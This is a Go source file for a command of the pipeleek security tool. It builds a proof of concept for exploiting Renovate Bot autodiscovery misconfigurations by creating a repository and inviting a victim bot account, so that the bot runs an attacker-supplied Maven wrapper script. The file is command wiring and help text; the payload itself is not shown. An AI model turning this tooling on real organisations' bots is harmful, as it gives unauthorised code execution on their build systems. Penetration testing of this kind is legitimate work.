package autodiscovery

import (
	"github.com/rs/zerolog/log"

	"github.com/CompassSecurity/pipeleek/pkg/config"
	pkgrenovate "github.com/CompassSecurity/pipeleek/pkg/github/renovate/autodiscovery"
	pkgscan "github.com/CompassSecurity/pipeleek/pkg/github/scan"
	"github.com/spf13/cobra"
)

var (
	autodiscoveryRepoName string
	autodiscoveryUsername string
)

func NewAutodiscoveryCmd() *cobra.Command {
	autodiscoveryCmd := &cobra.Command{
		Use:   "autodiscovery",
		Short: "Create a PoC for Renovate Autodiscovery misconfigurations exploitation",
		Long:  "Create a repository with a Renovate Bot configuration that will be picked up by an existing Renovate Bot user. The Renovate Bot will execute the malicious Maven wrapper script during dependency updates, which you can customize in exploit.sh. Note: On GitHub, the bot/user account must proactively accept the invite.",
		Example: `
# Create a repository and invite the victim Renovate Bot user to it. Uses the Maven wrapper to execute arbitrary code during dependency updates.
pipeleek gh renovate autodiscovery --token ghp_xxxxx --github https://api.github.com --repo-name my-exploit-repo --username renovate-bot-user
		`,
		Run: func(cmd *cobra.Command, args []string) {
			if err := config.AutoBindFlags(cmd, map[string]string{
				"github":    "github.url",
				"token":     "github.token",
				"repo-name": "github.renovate.autodiscovery.repo_name",
				"username":  "github.renovate.autodiscovery.username",
			}); err != nil {
				log.Fatal().Err(err).Msg("Failed to bind command flags to configuration keys")
			}

			if err := config.RequireConfigKeys("github.token"); err != nil {
				log.Fatal().Err(err).Msg("required configuration missing")
			}

			autodiscoveryRepoName = config.GetString("github.renovate.autodiscovery.repo_name")
			autodiscoveryUsername = config.GetString("github.renovate.autodiscovery.username")

			githubUrl := config.GetString("github.url")
			githubApiToken := config.GetString("github.token")

			client := pkgscan.SetupClient(githubApiToken, githubUrl)
			pkgrenovate.RunGenerate(client, autodiscoveryRepoName, autodiscoveryUsername)
		},
	}
	autodiscoveryCmd.Flags().StringVarP(&autodiscoveryRepoName, "repo-name", "r", "", "The name for the created repository")
	autodiscoveryCmd.Flags().StringVarP(&autodiscoveryUsername, "username", "u", "", "The username of the victim Renovate Bot user to invite")

	return autodiscoveryCmd
}
